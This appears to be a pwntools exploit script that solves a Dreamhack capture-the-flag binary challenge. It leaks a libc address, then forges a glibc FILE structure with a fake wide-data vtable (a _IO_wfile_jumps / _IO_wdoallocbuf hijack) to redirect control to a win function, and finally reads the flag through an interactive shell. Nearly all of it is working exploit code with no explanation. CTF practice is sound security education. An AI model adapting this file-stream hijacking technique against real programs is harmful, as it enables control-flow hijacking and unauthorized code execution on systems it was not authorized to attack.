#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './chall_patched'
HOST = 'host8.dreamhack.games'
PORT = 24119

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x40122a
b*__GI__IO_flush_all
b*_IO_wfile_overflow
b*_IO_wdoallocbuf
b*_IO_wdoallocbuf+52
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
rcu(b"puts @ 0x")
libc.address = int(rcu(b"\n"), 16) - libc.sym['puts']
log.success(f"libc base: {hex(libc.address)}")

win = exe.sym.win
stdout = libc.sym['_IO_2_1_stdout_']
vtable = libc.sym['_IO_wfile_jumps']

fp = FileStructure()
fp.chain = stdout - 0x80 # mov to fake FILE struct 1

buf = stdout - 0xe0 # fake FILE struct 2

fp._IO_read_ptr = 0x4040a0 # _lock
fp._IO_write_base = buf # wide_data
fp._IO_save_end = vtable # fake_vtable

fp.markers = win
flags = stdout - 0x8 # rax in <_IO_wdoallocbuf+52> call qword ptr [rax + 0x68]
payload = p64(flags)
payload += (bytes(fp))[0x8:0x70]

s(payload)
sl(b"cat flag*")
p.interactive()